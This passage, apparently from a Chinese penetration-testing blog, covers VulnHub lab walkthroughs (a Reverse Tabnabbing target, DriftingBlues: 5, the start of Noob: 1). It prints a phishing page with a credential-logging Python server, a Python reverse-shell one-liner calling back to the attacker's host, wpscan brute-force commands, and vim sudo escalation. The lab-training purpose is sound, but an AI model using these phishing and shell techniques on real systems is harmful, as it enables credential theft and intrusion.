seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 登录界面，不过允许注册账号，注册账号登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161244283.png" /></p>
<p>没发现什么漏洞，扫目录也没得到有价值的信息，看了其他人的 WP
说登陆后的 welcome.php 存在 Reverse Tabnabbing 攻击【<a
href="https://xz.aliyun.com/t/7080?time__1311=n4%2BxnD0GDti%3D0%3Ddex05%2Bbze0Qjpl2DY5DkeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">钓鱼攻击之Reverse
Tabnabbing - 先知社区</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161242322.png" /></p>
<p>phish.html【恶意代码-重定向原页面至钓鱼页面】</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">opener</span>) <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">parent</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;http://192.168.159.152:8000/index.html&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">opener</span>  != <span class="variable language_">window</span>) <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">parent</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;http://192.168.159.152:8000/index.html&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>index.html【登录界面源码-钓鱼页面】</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span>&#123; <span class="attribute">font</span>: <span class="number">14px</span> sans-serif; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.wrapper</span>&#123; <span class="attribute">width</span>: <span class="number">360px</span>; <span class="attribute">padding</span>: <span class="number">20px</span>; &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please fill in your credentials to login.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control &quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;invalid-feedback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control &quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;invalid-feedback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Don&#x27;t have an account? <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;register.php&quot;</span>&gt;</span>Sign up now<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用 python 开启 web 服务，利用 nc 在 8000 监听，提交
<code>http://192.168.159.152/phish.html</code> ，等一会……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161301915.png" /></p>
<p>或者将 phish.html 和 index.html 整合，写个 python 脚本来处理 POST
提交的用户登录信息</p>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span>&#123; <span class="attribute">font</span>: <span class="number">14px</span> sans-serif; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.wrapper</span>&#123; <span class="attribute">width</span>: <span class="number">360px</span>; <span class="attribute">padding</span>: <span class="number">20px</span>; &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please fill in your credentials to login.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control &quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;invalid-feedback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control &quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;invalid-feedback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Don&#x27;t have an account? <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;register.php&quot;</span>&gt;</span>Sign up now<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 重定向原页面至钓鱼页面 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">opener</span>) <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">parent</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;http://192.168.159.152/index.html&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">opener</span>  != <span class="variable language_">window</span>) <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">parent</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;http://192.168.159.152/index.html&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>server.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleHTTPRequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Open the static file requested and send it</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(self.path[<span class="number">1</span>:], <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                self.send_response(<span class="number">200</span>)</span><br><span class="line">                self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                self.wfile.write(file.read())</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            self.send_response(<span class="number">404</span>)</span><br><span class="line">            self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(<span class="string">b&#x27;404 Not Found&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        content_length = <span class="built_in">int</span>(self.headers[<span class="string">&#x27;Content-Length&#x27;</span>])</span><br><span class="line">        post_data = self.rfile.read(content_length).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        post_params = parse_qs(post_data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 处理登录信息，这里可以将信息保存到文件、数据库或者进行其他操作</span></span><br><span class="line">        username = post_params.get(<span class="string">&#x27;username&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">        password = post_params.get(<span class="string">&#x27;password&#x27;</span>, [<span class="string">&#x27;&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Received login info - Username: <span class="subst">&#123;username&#125;</span>, Password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 返回重定向响应</span></span><br><span class="line">        self.send_response(<span class="number">303</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;http://192.168.159.149/welcome.php&#x27;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=<span class="number">80</span></span>):</span><br><span class="line">    server_address = (<span class="string">&#x27;&#x27;</span>, port)</span><br><span class="line">    httpd = server_class(server_address, handler_class)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Starting server on port <span class="subst">&#123;port&#125;</span>...&#x27;</span>)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提交 <code>http://192.168.159.152/index.html</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161246912.png" /></p>
<p>靶机用户登录得
<code>Username: daniel, Password: C@ughtm3napping123</code></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>ssh 登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161307897.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>/home/adrian 下找到个定时任务</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161324924.png" /></p>
<p>经查 daniel 用户对 query.py 有写权限，弹个 adrian 用户的 shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168,159.152&quot;</span>,<span class="number">8080</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161324925.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161330974.png" /></p>
<p>拿到个 flag ，继续提权……</p>
<p><code>sudo -l</code> 找到个 vim ，利用 vim 提权至 root <a
href="https://gtfobins.github.io/gtfobins/vim/">vim | GTFOBins</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161334975.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404161334976.png" /></p>
<p>成功！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
        <tag>Reverse Tabnabbing</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 5</title>
    <url>/2024/03/28/DriftingBlues%205/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/driftingblues-5,662/">DriftingBlues:
5 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281542474.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281542786.png" /></p>
<p>22,80</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>扫目录，并用 wpscan 扫下站点</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281543698.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://192.168.159.139/&quot;</span> --ignore-main-redirect --force  -eu </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281544993.png" /></p>
<p>枚举出几个用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">abuzerkomurcu</span><br><span class="line">gadd</span><br><span class="line">gill</span><br><span class="line">collins</span><br><span class="line">satanic</span><br></pre></td></tr></table></figure>
<p>尝试对用户爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://192.168.159.139/&quot;</span> --usernames user.txt --passwords rockyou.txt </span><br></pre></td></tr></table></figure>
<p>扫了半天……未出结果……谷歌……利用 cewl 从靶机的 WP 网站生成个字典</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w password.txt http://192.168.159.139</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281545905.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281545163.png" /></p>
<p>得 gill / interchangeable</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281546131.png" /></p>
<p>哎……………………</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>登录 wp: gill/interchangeable</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281638897.png" /></p>
<p>shell 也上传不了，也没找到其他漏洞……谷歌……dblogo.png有隐藏信息</p>
<p>下载到 kali 看看</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281642700.png" /></p>
<p><code>exiftool dblogo.png</code> 看起来更清楚</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281644343.png" /></p>
<p>ssh 登录测试 gill/59583hello</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281646366.png" /></p>
<p>拿到 flag1</p>
<h3 id="提权">2.2. 提权</h3>
<p>同目录还有个 keyfile.kdbx【<a
href="https://blog.csdn.net/u012206617/article/details/130964836">kdbx后缀文件打开-CSDN博客</a>】
，可能有提权信息，用 scp 传到 kali 解密看下</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281649949.png" /></p>
<p>爆破得 <code>porsiempre       (keyfile)</code></p>
<p>安装 keepass2 后打开 keyfile.kdbx</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281728556.png" /></p>
<p>？？？……找找其他提权方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment"># 查suid</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">find / -writable 2&gt;/dev/null | grep -v /proc  <span class="comment"># 查找具有写入权限的文件</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab /etc/cron.d/* <span class="comment"># 定时任务</span></span><br><span class="line">crontab -l</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure>
<p>根目录扫到个 /keyfolder 但里面是空的……</p>
<p>又卡住了……谷歌……用 <code>pspy</code> 可以监测到定时任务，下载上传【<a
href="https://github.com/DominicBreuker/pspy">GitHub -
DominicBreuker/pspy: Monitor linux processes without root
permissions</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281744446.png" /></p>
<p>会定时执行 <code>/root/key.sh</code> ，新建 fracturedocean 文件后得到
root 密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281746133.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281747838.png" /></p>
<p>拿到 flag2</p>
<h3 id="参考">2.3. 参考</h3>
<p><a href="https://www.cnblogs.com/sainet/p/16302229.html">Vulnhub 靶场
DRIFTINGBLUES: 5 - sainet - 博客园</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Noob: 1</title>
    <url>/2024/04/18/Noob%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a href="https://www.vulnhub.com/entry/noob-1,746/">Noob: 1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts             </span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240        </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.           </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      1      60  VMware, Inc.        </span><br><span class="line">192.168.159.154 00:0c:29:1f:e6:af      1      60  VMware, Inc.         </span><br><span class="line">192.168.159.254 00:50:56:f5:b3:6f      1      60  VMware, Inc. </span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.154</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-18 02:42 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.154</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.159.152</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 0        0              21 Sep 21  2021 cred.txt</span><br><span class="line">|_-rw-r--r--    1 0        0              86 Jun 11  2021 welcome</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Login</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">55077/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 dc:e8:ad:80:35:81:c4:29:7e:cf:e4:70:f2:69:d9:96 (RSA)</span><br><span class="line">|   256 46:20:20:03:9c:97:35:f6:2d:5d:62:4a:be:6c:95:8e (ECDSA)</span><br><span class="line">|_  256 ae:90:88:f6:63:8d:dc:60:fa:ff:<span class="built_in">fc</span>:70:12:e4:f4:1f (ED25519)</span><br><span class="line">MAC Address: 00:0C:29:1F:E6:AF (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.64 ms 192.168.159.154</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 30.19 seconds</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181656152.png" /></p>
